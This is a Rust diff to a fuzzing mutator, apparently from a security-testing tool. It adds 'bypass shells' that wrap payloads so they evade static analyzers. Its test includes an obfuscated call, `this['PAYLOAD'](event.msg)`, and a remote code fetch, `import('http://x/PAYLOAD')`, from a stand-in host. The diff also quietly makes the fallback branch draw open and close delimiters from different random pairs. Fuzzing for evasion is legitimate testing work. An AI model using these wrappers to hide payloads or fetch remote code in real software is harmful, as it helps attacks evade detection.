@@ -207,6 +207,11 @@ pub struct HavocMutator {
     pub rng_mode: RngMode,
     /// Per-operator sampling weights. `pub` so adaptive tuning can read/update.
     pub schedule: HavocSchedule,
+    /// Optional bypass shells: pairs of (prefix, suffix) used by `WrapDelimiter`.
+    /// When non-empty, `WrapDelimiter` prefers these over the generic delimiter
+    /// pairs — useful for snapping a static-analyzer bypass wrapper around a
+    /// payload (e.g. `this['` + `base` + `'](event.msg)`).
+    shells: Vec<(String, String)>,
 }
 
 impl HavocMutator {
@@ -220,12 +225,19 @@ impl HavocMutator {
             rng: RngEngine::from_entropy(rng_mode),
             rng_mode,
             schedule: HavocSchedule::default(),
+            shells: Vec::new(),
         }
     }
 
     /// Override the operator schedule (e.g., `HavocSchedule::uniform()` for tests).
     pub fn with_schedule(mut self, schedule: HavocSchedule) -> Self {
         self.schedule = schedule;
+        self
+    }
+
+    /// Provide bypass shell pairs for `WrapDelimiter`.
+    pub fn with_shells(mut self, shells: Vec<(String, String)>) -> Self {
+        self.shells = shells;
         self
     }
 
@@ -375,8 +387,13 @@ impl HavocMutator {
                 payload.repeat(n)
             }
             HavocOp::WrapDelimiter => {
-                let (open, close) =
-                    DELIMITER_PAIRS[self.rng.gen_range(0..DELIMITER_PAIRS.len())];
+                let (open, close): (&str, &str) = if self.shells.is_empty() {
+                    (DELIMITER_PAIRS[self.rng.gen_range(0..DELIMITER_PAIRS.len())].0,
+                     DELIMITER_PAIRS[self.rng.gen_range(0..DELIMITER_PAIRS.len())].1)
+                } else {
+                    let pair = &self.shells[self.rng.gen_range(0..self.shells.len())];
+                    (pair.0.as_str(), pair.1.as_str())
+                };
                 format!("{}{}{}", open, payload, close)
             }
             HavocOp::Reverse => {
@@ -478,6 +495,25 @@ mod tests {
             if r.len() > "payload".len() { wrapped = true; break; }
         }
         assert!(wrapped);
+    }
+
+    #[test]
+    fn wrap_delimiter_uses_bypass_shells_when_configured() {
+        let mut m = HavocMutator::new(WeightedSampler::uniform(), 100)
+            .with_shells(vec![
+                ("this['".into(), "'](event.msg)".into()),
+                ("import('http://x/".into(), "')".into()),
+            ]);
+        let shells = [
+            "this['PAYLOAD'](event.msg)",
+            "import('http://x/PAYLOAD')",
+        ];
+        let mut found = 0u32;
+        for _ in 0..100 {
+            let r = m.apply_op("PAYLOAD", HavocOp::WrapDelimiter);
+            if shells.iter().any(|s| r == *s) { found += 1; }
+        }
+        assert!(found > 50, "configured shells rarely used ({found}/100)");
     }
 
     #[test]
